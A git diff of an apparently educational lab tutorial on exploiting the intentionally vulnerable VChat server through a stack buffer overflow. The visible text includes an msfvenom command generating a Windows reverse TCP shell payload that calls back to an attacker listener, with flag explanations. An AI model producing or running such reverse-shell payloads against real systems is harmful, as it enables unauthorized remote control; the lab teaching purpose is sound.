@@ -256,13 +256,13 @@ Now that we have all the necessary parts for the creation of a exploit we will d
 ### Exploitations
 Up until this point in time,  we have been performing [Denial of Service](https://attack.mitre.org/techniques/T0814/) (DoS) attacks. Since we simply overflowed the stack with what is effectively garbage address values (A series of `A`s, `B`s and `C`s) all we have done with our exploits is crash the VChat server. Now, we have all the information necessary to control the flow of VChat's execution, allowing us to inject [Shellcode](https://www.sentinelone.com/blog/malicious-input-how-hackers-use-shellcode/) and perform a more meaningful attack.
 
-1. We first need to generate some shell code to inject into the process. We will use the [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) tool to both generate shellcode and encode it to ensure it is transmitted properly. We **must** encode the resulting shellcode so it does not contain any null bytes `0x0`, carriage returns `\r` or newlines `\n`, as their presence would prevent the shellcode from properly executing by breaking the transmission, reception or execution of the shellcode.
-
-Note: you may need to type the command since copy and paste may not work.
+1. We first need to generate some shell code to inject into the process. We will use the [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) tool to both generate shellcode and encode it to ensure it is transmitted properly. We **must** encode the resulting shellcode so it does not contain any null bytes `0x0`, carriage returns `\r` or newlines `\n`, as their presence would prevent the shellcode from properly executing by breaking the transmission, reception or execution of the shellcode. **Note**: you may need to type the command since copy and paste may not work.
 
 	```sh
 	$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.7 LPORT=8080 EXITFUNC=thread -f python -v SHELL -b '\x00x\0a\x0d'
 	```
+
+ 
 	* `-p `: Payload we are generating shellcode for.
     	* `windows/shell_reverse_tcp`: Reverse TCP payload for Windows.
     	* `LHOST=10.0.2.7`: The remote listening host's IP, in this case our Kali machine's IP `10.0.2.7`.
